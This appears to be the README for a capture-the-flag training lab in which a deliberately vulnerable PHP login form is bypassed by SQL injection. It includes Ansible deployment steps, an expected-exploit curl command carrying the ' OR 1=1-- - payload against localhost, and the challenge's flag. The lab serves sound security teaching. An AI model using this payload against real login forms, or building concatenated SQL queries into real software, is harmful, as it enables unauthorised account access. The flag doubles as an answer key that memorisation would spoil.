# sqli-login — SQL Injection Login Bypass

**Vulnerability:** Login form passes unsanitised input directly into a SQL query  
**Tools:** `curl`, `sqlmap`  
**Flag:** `WMG{sq1_1nj3ct10n_byp4ss3d_auth}`

## Scenario

Pinnacle Finance runs a web application with a login form (`/login.php`).
The PHP backend constructs a SQL query by string concatenation: `WHERE username='$u' AND password='$p'`.
A classic `' OR 1=1-- -` payload bypasses authentication and returns the flag.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/sqli-login/setup.yml
```

First run: `ok=12 changed=8`  
Second run: `ok=11 changed=1` (Apache restart is intentional; idempotent otherwise)

## Verify

```bash
./agent-harness/verify.sh sqli-login
```

## Expected exploit

```bash
curl -s -X POST http://127.0.0.1/login.php \
  -d "username=' OR 1=1-- -&password=anything"
# → WMG{sq1_1nj3ct10n_byp4ss3d_auth}
```

## Training

`training.json` — 9 levels: web enumeration → login form discovery → SQLi theory → payload crafting → auth bypass → flag → sqlmap automation → ASSESSMENT.  
MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1110.001 (Brute Force).  
CyberRangeCZ subnet: 10.1.29.0/24
